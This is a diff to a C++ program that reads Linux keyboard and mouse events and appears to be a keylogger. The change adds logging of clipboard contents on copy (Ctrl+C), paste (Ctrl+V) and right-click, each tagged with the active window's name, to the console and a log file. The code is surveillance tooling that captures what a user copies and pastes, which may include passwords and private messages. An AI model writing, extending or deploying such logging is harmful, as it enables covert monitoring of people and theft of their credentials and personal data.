@@ -184,10 +184,17 @@ int main(int argc, char* argv[]) {
                             capsLockActive = !capsLockActive; // Toggle CAPSLOCK state
                         } else if (ctrlPressed && event.code == KEY_C) { // Detect CTRL+C (copy)
                             string clipboardContent = getClipboardContent();
+                            if (!clipboardContent.empty()) {
+                                cout << endl << "[COPY from " << currentActiveWindow << "]: [" << clipboardContent << "]" << endl;
+                                logFile << endl << "[COPY from " << currentActiveWindow << "]: [" << clipboardContent << "]" << endl;
+                                logFile.flush();
+                            }                       
+                        } else if (ctrlPressed && event.code == KEY_V) { // Detect CTRL+V (Paste)
+                            string clipboardContent = getClipboardContent();
                             if (!clipboardContent.empty() && clipboardContent != lastClipboardContent) {
                                 lastClipboardContent = clipboardContent;
-                                cout << "[COPY from " << currentActiveWindow << "]: " << clipboardContent << endl;
-                                logFile << "[COPY from " << currentActiveWindow << "]: " << clipboardContent << endl;
+                                cout << endl << "[PASTE TO " << currentActiveWindow << "]: " << clipboardContent << endl;
+                                logFile << endl << "[PASTE TO " << currentActiveWindow << "]: [" << clipboardContent << "]" << endl;
                                 logFile.flush();
                             }
                         } else {                            
@@ -225,8 +232,9 @@ int main(int argc, char* argv[]) {
                 if (event.type == EV_KEY && event.value == 1) { // Mouse button press
                     if (event.code == BTN_RIGHT) { // Right-click triggers clipboard check
                         string clipboardContent = getClipboardContent();
-                        if (!clipboardContent.empty() && clipboardContent != lastClipboardContent) {
-                            lastClipboardContent = clipboardContent;
+                        // logFile << "[Test]" << BTN_RIGHT << " " << event.code << " " << clipboardContent;
+                        if (!clipboardContent.empty()) {
+                            // lastClipboardContent = clipboardContent;
                             cout << "[RIGHT-CLICK COPY from " << currentActiveWindow << "]: " << clipboardContent << endl;
                             logFile << "[RIGHT-CLICK COPY from " << currentActiveWindow << "]: " << clipboardContent << endl;
                             logFile.flush();
